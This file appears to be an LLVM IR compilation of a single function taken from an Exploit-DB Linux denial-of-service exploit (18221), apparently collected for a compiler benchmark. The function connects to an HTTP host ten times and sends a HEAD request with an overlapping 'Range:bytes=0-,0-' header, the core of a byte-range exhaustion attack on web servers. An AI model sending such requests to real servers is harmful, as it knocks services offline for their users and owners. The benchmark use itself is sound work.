; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_18221.c_thread_start.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_18221.c_thread_start.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.thread_info = type { i32 }
%struct.addrinfo = type { i32, i32, i64, i32, i32, %struct.addrinfo*, i64 }

@AF_UNSPEC = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"http\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [71 x i8] c"HEAD / HTTP/1.1\0AHost:localhost\0ARange:bytes=0-,0-\0AAccept-Encoding: gzip\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (i8* (i8*)* @thread_start to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i8* @thread_start(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.thread_info*, align 8
  %4 = alloca [64 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca %struct.addrinfo, align 8
  %7 = alloca %struct.addrinfo*, align 8
  %8 = alloca %struct.addrinfo*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %12 = load i8*, i8** %2, align 8
  %13 = bitcast i8* %12 to %struct.thread_info*
  store %struct.thread_info* %13, %struct.thread_info** %3, align 8
  %14 = getelementptr inbounds [64 x i8], [64 x i8]* %4, i64 0, i64 0
  %15 = load %struct.thread_info*, %struct.thread_info** %3, align 8
  %16 = getelementptr inbounds %struct.thread_info, %struct.thread_info* %15, i32 0, i32 0
  %17 = load i32, i32* %16, align 4
  %18 = call i32 @strcpy(i8* %14, i32 %17)
  store i32 0, i32* %5, align 4
  br label %19

19:                                               ; preds = %92, %1
  %20 = load i32, i32* %5, align 4
  %21 = icmp ne i32 %20, 10
  br i1 %21, label %22, label %96

22:                                               ; preds = %19
  %23 = call i32 @memset(%struct.addrinfo* %6, i32 0, i32 40)
  %24 = load i32, i32* @AF_UNSPEC, align 4
  %25 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %6, i32 0, i32 4
  store i32 %24, i32* %25, align 4
  %26 = load i32, i32* @SOCK_STREAM, align 4
  %27 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %6, i32 0, i32 3
  store i32 %26, i32* %27, align 8
  %28 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %6, i32 0, i32 6
  store i64 0, i64* %28, align 8
  %29 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %6, i32 0, i32 2
  store i64 0, i64* %29, align 8
  %30 = getelementptr inbounds [64 x i8], [64 x i8]* %4, i64 0, i64 0
  %31 = call i32 @getaddrinfo(i8* %30, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), %struct.addrinfo* %6, %struct.addrinfo** %7)
  store i32 %31, i32* %10, align 4
  %32 = load i32, i32* %10, align 4
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %34, label %41

34:                                               ; preds = %22
  %35 = load i32, i32* @stderr, align 4
  %36 = load i32, i32* %10, align 4
  %37 = call i8* @gai_strerror(i32 %36)
  %38 = call i32 @fprintf(i32 %35, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0), i8* %37)
  %39 = load i32, i32* @EXIT_FAILURE, align 4
  %40 = call i32 @exit(i32 %39) #3
  unreachable

41:                                               ; preds = %22
  %42 = load %struct.addrinfo*, %struct.addrinfo** %7, align 8
  store %struct.addrinfo* %42, %struct.addrinfo** %8, align 8
  br label %43

43:                                               ; preds = %74, %41
  %44 = load %struct.addrinfo*, %struct.addrinfo** %8, align 8
  %45 = icmp ne %struct.addrinfo* %44, null
  br i1 %45, label %46, label %78

46:                                               ; preds = %43
  %47 = load %struct.addrinfo*, %struct.addrinfo** %8, align 8
  %48 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %47, i32 0, i32 4
  %49 = load i32, i32* %48, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %8, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 3
  %52 = load i32, i32* %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %8, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 2
  %55 = load i64, i64* %54, align 8
  %56 = call i32 @socket(i32 %49, i32 %52, i64 %55)
  store i32 %56, i32* %9, align 4
  %57 = load i32, i32* %9, align 4
  %58 = icmp eq i32 %57, -1
  br i1 %58, label %59, label %60

59:                                               ; preds = %46
  br label %74

60:                                               ; preds = %46
  %61 = load i32, i32* %9, align 4
  %62 = load %struct.addrinfo*, %struct.addrinfo** %8, align 8
  %63 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %62, i32 0, i32 1
  %64 = load i32, i32* %63, align 4
  %65 = load %struct.addrinfo*, %struct.addrinfo** %8, align 8
  %66 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %65, i32 0, i32 0
  %67 = load i32, i32* %66, align 8
  %68 = call i32 @connect(i32 %61, i32 %64, i32 %67)
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %70, label %73

70:                                               ; preds = %60
  %71 = load i32, i32* %9, align 4
  %72 = call i32 @close(i32 %71)
  br label %73

73:                                               ; preds = %70, %60
  br label %74

74:                                               ; preds = %73, %59
  %75 = load %struct.addrinfo*, %struct.addrinfo** %8, align 8
  %76 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %75, i32 0, i32 5
  %77 = load %struct.addrinfo*, %struct.addrinfo** %76, align 8
  store %struct.addrinfo* %77, %struct.addrinfo** %8, align 8
  br label %43

78:                                               ; preds = %43
  %79 = load %struct.addrinfo*, %struct.addrinfo** %7, align 8
  %80 = icmp ne %struct.addrinfo* %79, null
  br i1 %80, label %81, label %84

81:                                               ; preds = %78
  %82 = load %struct.addrinfo*, %struct.addrinfo** %7, align 8
  %83 = call i32 @freeaddrinfo(%struct.addrinfo* %82)
  br label %84

84:                                               ; preds = %81, %78
  %85 = load i32, i32* %9, align 4
  %86 = call i32 @write(i32 %85, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.2, i64 0, i64 0), i32 71)
  store i32 %86, i32* %11, align 4
  %87 = load i32, i32* %11, align 4
  %88 = icmp eq i32 %87, -1
  br i1 %88, label %89, label %92

89:                                               ; preds = %84
  %90 = load i32, i32* %9, align 4
  %91 = call i32 @close(i32 %90)
  br label %92

92:                                               ; preds = %89, %84
  %93 = call i32 @usleep(i32 300000)
  %94 = load i32, i32* %5, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %5, align 4
  br label %19

96:                                               ; preds = %19
  ret i8* null
}

declare dso_local i32 @strcpy(i8*, i32) #1

declare dso_local i32 @memset(%struct.addrinfo*, i32, i32) #1

declare dso_local i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

declare dso_local i8* @gai_strerror(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @socket(i32, i32, i64) #1

declare dso_local i32 @connect(i32, i32, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @freeaddrinfo(%struct.addrinfo*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @usleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
